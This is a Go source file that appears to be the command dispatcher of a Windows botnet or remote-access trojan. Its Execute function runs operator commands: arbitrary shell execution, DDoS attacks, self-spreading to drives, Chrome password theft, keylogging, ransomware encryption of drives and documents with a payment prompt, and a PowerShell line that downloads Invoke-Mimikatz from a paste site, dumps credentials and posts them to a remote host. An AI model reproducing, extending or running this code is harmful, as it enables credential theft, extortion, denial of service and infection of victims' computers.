package network

import "strings"
import "github.com/sqweek/dialog"
import "../utils"
import "../aes"
import "../pay"
import "../spread"
import "../passwords"
import (
	"../install"
	"../dos"
)

/*
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
*/
import "C"

func Execute(command string, target string, args string) {
	if target == "*" || target == utils.GetUsername() {
		switch command {
		case "cmd":
			utils.Run(args)
		case "off":
			utils.Run("shutdown /p /f")
		case "lo":
			utils.Run("shutdown /l /f")
		case "kill":
			utils.Run("taskkill /IM " + args + " /T /f")
		case "msg":
			utils.Run("msg * " + strings.Replace(args, "-", " ", -1))
		case "yn":
			title := "Alert"
			var text string
			//If title passed
			if len(strings.Split(args, ";")) > 1 {
				title = strings.Split(args, ";")[1]
				text = strings.Replace(strings.Split(args, ";")[0], "-", " ", -1)
			} else {
				text = strings.Replace(args, "-", " ", -1)
			}
			res := dialog.Message("%s", text).Title(title).YesNo()
			if res == true {
				Send("yn", utils.GetUsername()+" responds yes")
			} else {
				Send("yn", utils.GetUsername()+" responds no")
			}

		case "web":
			utils.Run("start " + args) //  Use /MIN to start minimized
		case "ddos":
			dos.DdosApi(100, args)
		case "sdd":
			dos.StopDdos()
		case "inf":
		case "infect":
			spread.CopyToDrives()
		case "pass":
			Send("pass", passwords.GetChromePassString())
		case "autoInf":
			spread.AutoInfect()
		case "stopAutoInf":
			spread.StopAutoInfect()
		case "upgrade":
			install.Upgrade(args)
		case "uninstall":
			install.Uninstall()
		case "start-keylogger":
			passwords.KeyLogger()
		case "keylog":
			Send("res", utils.TmpKeylog)
		case "please":
			utils.Please(args)
		case "mimi":
			utils.Run(`powershell "IEX (New-Object Net.WebClient).DownloadString('https://paste.ee/r/0ZlX2'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://` + getIPTor() + `', 'POST' , $output)"`)
		case "ransom":
			spread.EncryptExternalDrives(true)
			aes.EncryptDocumets("C:\\", true)
			//Encrypt net drives

			// Once encrypted
			//WriteRegDone()
			// Write done to pastebin
			pay.PromtPay()

			//ListenForPayment()

		default:
			Send("res", "Not a command")
		}
	}
}
